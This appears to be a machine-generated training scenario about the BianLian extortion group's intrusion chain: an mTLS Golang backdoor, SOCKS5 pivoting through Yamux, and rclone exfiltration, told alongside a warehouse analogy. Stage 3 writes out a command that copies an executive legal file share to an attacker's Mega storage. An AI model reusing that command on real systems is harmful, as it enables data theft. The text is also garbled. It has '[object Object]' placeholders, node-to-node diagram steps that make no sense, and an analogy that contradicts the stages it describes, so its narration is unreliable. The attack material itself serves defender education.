scenario.name: BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion (AA23-136A)
scenario.overview: Imagine a high-ceiling logistics warehouse with towering steel pallet racks stacked with labeled shipping crates, clipboard dock stations, and a bright yellow forklift cruising down the aisle. Inside the bustling logistics warehouse, an unverified driver climbs into a parked yellow forklift and rolls toward the high-bay customer storage racks. In this real-world scenario, the intruder leaves a hidden spare latch behind so they can walk back into the logistics warehouse later, then smuggles copied records out past the loading dock check-out clipboards in tiny disguised batches. The warehouse barcode inventory system flashes an urgent alert when hundreds of customer pallets are relabeled in minutes outside normal shift hours. In this scenario (T1573.002, BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion (AA23-136A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: deploying Custom Golang mTLS Backdoor, then in-Memory Yamux Multiplexing, then pure Data-Exfiltration Extortion via Rclone. Steps #1–#3 walk that chain end-to-end by covering Deploying Custom Golang mTLS Backdoor, then In-Memory Yamux Multiplexing, then Pure Data-Exfiltration Extortion via Rclone, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.

stages.title: Stage 1: Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning
stages.subtitle: Command and Control (T1573.002 - Asymmetric Cryptography / mTLS)
stages.description: Inside the bustling logistics warehouse, an unverified driver climbs into a parked yellow forklift and rolls toward the high-bay customer storage racks. Specifically in Step 1, the intruder leaves a hidden spare latch behind so they can walk back into the logistics warehouse later while everyday visitors and the warehouse dispatcher go about their routine. After initial entry, BianLian dropped a uniquely compiled 64-bit Golang executable (masquerading under Windows system filenames like SystemSettingsAdminFlows.exe or Win64Ark.exe) that initiated an outbound mutual TLS (mTLS) connection directly to a hardcoded C2 IP address (embedding both the client X.509 certificate/private key and the expected C2 server certificate inside the Go binary so network middleboxes and security scanners could not intercept or probe the C2 server). Because the C2 IP and X.509 certificates are compiled directly into each binary right before deployment, every victim receives a distinct file hash. In the documented EventID 3 exchange from BianLian Extortion C2 & Mega/FTP Drop to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK 3 (confirming that the SystemSettingsAdminFlows.exe request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot). On the diagram, follow Step #1 / Link #1 (#1→ SystemSettingsAdminFlows.exe / ⇠#1 ACK 3) from Node ① (#1 BianLian Extortion C2 & Mega/FTP Drop) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Pure Exfiltration (rclone / SharpShares)).

stages.title: Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot
stages.subtitle: Command and Control (T1090.001 - Internal Proxy / SOCKS5)
stages.description: Lifting stacked pallets off the shelves, the driver slaps a brand-new shipping barcode and their own heavy padlock onto every customer crate in the bay. Here in Step 2 inside the logistics warehouse, the intruder moves quietly past the loading dock check-out clipboards into neighboring restricted rooms without disturbing the quarantined audit cage. Once the mTLS socket connected, the Golang backdoor wrapped the TLS stream in a HashiCorp Yamux connection multiplexer (github.com/hashicorp/yamux) and attached an in-memory SOCKS5 server (github.com/armon/go-socks5, allowing the external operator to route Impacket, SharpShares, LDAP queries, and SMB file reads through the single compromised host without dropping secondary implants onto target file servers). By centralizing C2 and proxying inside a single lightweight Go binary that contains zero exploit code or encryption routines, BianLian minimizes its endpoint footprint across the domain. In the documented EDR exchange from Perimeter Firewall & NDR Tap to Golang mTLS Backdoor (Windows/Linux), Golang mTLS Backdoor (Windows/Linux) responds with ALERT T1090.001 (confirming that the Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot request succeeded on Golang mTLS Backdoor (Windows/Linux) and establishing the runtime state required for Step #3 Stage 3: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)). On the diagram, follow Step #2 / Link #2 (#2→ Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot / ⇠#2 ALERT T1090.001) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Golang mTLS Backdoor (Windows/Linux)), monitored by Node ⑥ (#6 Pure Exfiltration (rclone / SharpShares)).

stages.title: Stage 3: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)
stages.subtitle: Exfiltration (T1567.002 - Exfiltration to Cloud Storage / T1048)
stages.description: When the real warehouse dispatcher arrives for morning pickup, every pallet is locked behind someone else’s key and rerouted toward an unknown loading dock. In this final step inside the logistics warehouse, the intruder smuggles copied records out past the loading dock check-out clipboards in tiny disguised batches until the warehouse barcode inventory log catches the mismatch. Skipping file encryption completely (thereby evading all EDR behavioral ransomware sensors that watch for mass file-rename or high-entropy overwrite loops), BianLian staged a renamed copy of rclone.exe (e.g., C:\ProgramData\Win.exe) or FileZilla to stream sensitive intellectual property, financial records, and PII to Mega.io cloud storage or attacker FTP servers, leaving behind Look_at_this_file.txt demanding payment to prevent public disclosure. Even when rclone.exe is renamed to Win.exe or svchost.exe, its PE version-info header (OriginalFileName: rclone.exe) and Go symbol table remain intact and detectable by YARA/Sysmon. Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage's output now drives the next action). On the diagram, follow Step #3 / Link #3 (#3→ C:\ProgramData\Win.exe copy "\\fileserver\Executive_Legal" mega:bianlian_vault --bwlimit 50M / ⇠#3 ACK 1) from Node ③ (#3 Golang mTLS Backdoor (Windows/Linux)) to Node ④ (#4 Embedded go-socks5 Memory Proxy), monitored by Node ⑥ (#6 Pure Exfiltration (rclone / SharpShares)).
